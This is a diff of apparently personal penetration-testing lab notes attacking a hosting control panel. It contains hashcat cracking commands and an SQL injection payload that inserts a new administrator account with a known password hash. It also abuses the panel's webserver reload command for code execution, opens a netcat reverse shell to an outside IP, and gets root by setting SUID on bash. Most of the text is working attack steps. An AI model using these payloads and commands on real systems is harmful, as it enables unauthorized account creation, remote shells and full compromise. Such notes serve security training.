@@ -172,6 +172,14 @@ hashcat -m 7400 panel.hash /usr/share/wordlists/rockyou.txt
 hashcat -m 7400 flybike.hash /usr/share/wordlists/rockyou.txt
 
 # need to use a different exploit, as the first one requires that you already have the admin creds
+# use #4 from here: https://www.exploit-db.com/exploits/50502
+# add the following to the db name in 'create database'
+`;insert into panel_admins (loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings) values ('x','$5$ccd0bcdd9ab970b1$Hx/a0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8',1,1,1,1);--
 
-s=fdbdf63173d0b332ce13a148476499b2&page=mysqls&action=add&send=send&custom_suffix=%60%3Binsert+into+panel_admins+%28loginname%2Cpassword%2Ccustomers_see_all%2Cdomains_see_all%2Ccaneditphpsettings%2Cchange_serversettings%29+values+%28%27x%27%2C%27%245%24ccd0bcdd9ab970b1%24Hx%2Fa0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8%27%2C1%2C1%2C1%2C1%29%3B--&description=x&mysql_password=claudiatest&mysql_password_suggestion=oyxtjaihgb&sendinfomail=0
+# settings -> webserver -> webserver reload command as administrator, then reload configuration files
+# the shell back doesn't work probably because i'm already using the ports 80,, 443
+# changing bash to suid binary then executing bash -p is another great way to get root shell  
+nc -e bash 192.168.45.160 443
+chmod u+s /usr/bin/bash
+bash -p
 ```
